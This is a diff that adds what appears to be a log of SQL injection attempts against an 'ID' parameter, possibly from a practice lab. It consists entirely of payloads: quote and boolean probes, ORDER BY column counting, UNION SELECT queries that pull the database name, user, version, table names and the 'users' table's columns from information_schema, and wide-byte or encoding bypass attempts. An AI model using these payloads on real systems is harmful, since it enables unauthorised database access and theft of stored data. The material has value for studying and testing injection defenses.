@@ -1,0 +1,75 @@
+ID:1
+ID:1
+ID:1\'
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1 and 1=2
+ID:1 and 1=2
+ID:1\'
+ID:1\' order by 1 #
+ID:1\' order by 8 #
+ID:1
+ID:1\'
+ID:1\' sdfsd
+ID:1\' sdfsd
+ID:1
+ID:1dsasdfasdf
+ID:1dsasdfasdf\'\"fg\"\'
+ID:1dsasdfasdf\'\"fg\"\'
+ID:\'1
+ID:1\' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+ID:1\' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+ID:1\' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+ID:1\' union select 1,2,3 #
+ID:1\' union select 1,2,3,4 #
+ID:1\' union select 1,concat_ws(\'_\',user(),version(),database()),@@basedir
+ID:1\' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#
+ID:1
+ID:1\'
+ID:1\' and 1=2
+ID:1\' and 1=1
+ID:1
+ID:1 and 1=1
+ID:1 and 1=2
+ID:1\' and 1=2
+ID:\'1 and 1=2
+ID:\' and 1=1
+ID:1
+ID:1\'
+ID:1 and 1=2
+ID:1 and 1=1
+ID:1\' and 1=1
+ID:1
+ID:0\'
+ID:-1\' union select 1,2,database() -- 
+ID:1\' order by 4 
+ID:0\' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\'users\' -- 
+ID:-1\' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\'users\' -- 
+ID:0\' union select 1,2,3 -- -
+ID:0\' union select 1,2,3 -- 
+ID:1\' union select 1,2,3 -- 
+ID:1\' union select 1,2,3 
+ID:1\' union select 1,2,3,4 
+ID:1\' union select 1,2 
+ID:1\'union select 1,2,3-- 
+ID:1\'
+ID:1\'
+ID:1\'
+ID:1\\,
+ID:1\\,\'
+ID:1\\\' and 1=2
+ID:1¿
+ID:1¿ and 1=2
+ID:1¿ and 1=2 
+ID:1¿ \'and 1=2 
+ID:1¿ \',and 1=2 
+ID:1¿ \',orv 1=2 
+ID:1¿ \',or 1=2 
+ID:1¿ \',or 1=2 
+ID:%u02b9
+ID:1\'
+ID:1%\'
+ID:1%\'
+ID:1\'
+ID:1
+ID:1Öâ€˜ AND 1=2#
